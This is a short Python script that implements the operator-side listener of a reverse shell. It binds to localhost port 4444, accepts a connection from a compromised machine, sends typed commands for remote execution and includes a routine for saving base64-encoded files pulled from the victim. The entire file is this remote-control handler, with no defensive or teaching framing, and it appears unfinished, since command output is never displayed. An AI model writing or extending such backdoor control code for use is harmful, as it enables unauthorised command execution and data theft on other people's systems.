#!/usr/bin/python
import socket
import json
import base64
import communicate as comms


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def execute_remotely(self, command):
        comms.send(self.connection, command)
        return comms.receive(self.connection)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download succesful."

    def run(self):
        while True:
            command = input(">> ")
            #command = command.split(' ')
            result = self.execute_remotely(command)
            

my_listener = Listener("localhost", 4444)
my_listener.run()